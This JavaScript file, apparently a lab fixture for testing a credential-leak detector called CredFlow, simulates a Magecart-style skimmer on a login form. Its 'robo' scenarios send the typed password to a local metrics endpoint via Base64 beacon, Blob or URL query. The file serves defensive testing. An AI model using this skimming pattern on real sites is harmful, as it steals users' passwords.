// "Analítica" de la tienda: en los escenarios de robo simula un script comprometido (tipo Magecart).
// Solo para el laboratorio de CredFlow, con credenciales ficticias.
(function () {
  const ESCENARIOS = {
    limpio: "El formulario se envía solo a la tienda. CredFlow no debe alertar.",
    robo: "Un script de terceros envía la contraseña en Base64 al dominio de métricas.",
    "robo-blob": "El script envía la contraseña dentro de un Blob, que Chrome no deja inspeccionar.",
    url: "El script envía la contraseña en la URL de una petición a la propia tienda.",
  };
  const params = new URLSearchParams(location.search);
  const escenario = params.get("escenario") in ESCENARIOS ? params.get("escenario") : "limpio";
  const METRICAS = `http://127.0.0.1:${location.port}`;

  document.getElementById("escenario").textContent = escenario;
  document.getElementById("descripcion").textContent = ESCENARIOS[escenario];

  const form = document.getElementById("login");
  form.addEventListener("submit", (event) => {
    event.preventDefault();
    const clave = form.querySelector('input[type="password"]').value;
    // Envío legítimo a la propia tienda.
    fetch("/recibir/login", { method: "POST", body: new URLSearchParams(new FormData(form)) });
    // Robo, según el escenario.
    if (escenario === "robo") {
      navigator.sendBeacon(`${METRICAS}/recibir/beacon`, "c=" + btoa(clave));
    } else if (escenario === "robo-blob") {
      fetch(`${METRICAS}/recibir/blob`, { method: "POST", body: new Blob([clave]) });
    } else if (escenario === "url") {
      fetch("/recibir/consulta?clave=" + encodeURIComponent(clave), { method: "POST" });
    }
    document.getElementById("resultado").textContent = "Formulario enviado.";
  });
})();
